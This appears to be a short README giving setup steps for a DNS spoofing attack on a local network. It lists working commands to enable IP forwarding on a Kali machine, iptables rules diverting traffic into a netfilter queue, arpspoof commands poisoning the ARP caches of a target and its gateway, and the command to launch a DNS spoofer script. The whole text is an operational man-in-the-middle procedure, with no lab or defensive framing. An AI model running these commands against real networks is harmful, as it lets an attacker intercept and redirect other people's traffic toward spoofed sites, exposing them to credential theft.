*****Set Up the Environment*****:

Ensure both your Kali machine and the target computer are connected to the same network.

1-- This allows your Kali machine to forward packets between the target and the gateway.
```sh
echo 1 > /proc/sys/net/ipv4/ip_forward
```
2 -- Use iptables to redirect DNS traffic to the netfilterqueue that your script will process.

```sh
sudo iptables -I FORWARD -j NFQUEUE --queue-num 0
sudo iptables -I OUTPUT -j NFQUEUE --queue-num 0
sudo iptables -I INPUT -j NFQUEUE --queue-num 0
```
3 -- Run arpspoof to poison the ARP cache of the target and the gateway.

```sh
sudo arpspoof -i [interface] -t [target_ip] [gateway_ip]
sudo arpspoof -i [interface] -t [gateway_ip] [target_ip]
```
4 -- Now, you can run your DNS spoofer script on your Kali machine.
```python3
sudo python3 dnsspoofer.py [target_domain] [spoofed_ip]
```
